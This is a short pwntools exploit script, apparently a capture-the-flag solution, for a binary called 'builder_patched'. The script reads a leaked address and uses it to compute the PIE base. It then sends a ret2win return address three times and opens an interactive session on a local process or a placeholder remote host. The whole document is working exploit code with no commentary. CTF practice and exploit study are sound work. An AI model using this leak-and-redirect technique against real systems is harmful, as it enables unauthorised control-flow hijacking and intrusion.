#!/usr/bin/env python3

from pwn import *

exe = ELF("./builder_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.recvuntil(b"name?")
    r.sendline(b"Test")
    r.recvuntil(b"Tank (")
    addr = r.recv(16)
    addr_val = int(addr,16)
    offset = 0x0000555555555369 - 0x0000555555554000
    log.success("calculated offset " + hex(offset))
    log.success(b"leaked address " + addr)
    exe.base = addr_val - offset
    log.success("exe base leaked " + hex(exe.base))

    ret_addr =  exe.base + 0x165f
    log.success("Found Ret2Win at " + hex(ret_addr))
    r.recv()
    r.sendline(format(ret_addr, "x"))
    r.recv()
    r.sendline(format(ret_addr, "x"))
    r.recv()
    r.sendline(format(ret_addr, "x"))

    r.interactive()


if __name__ == "__main__":
    main()
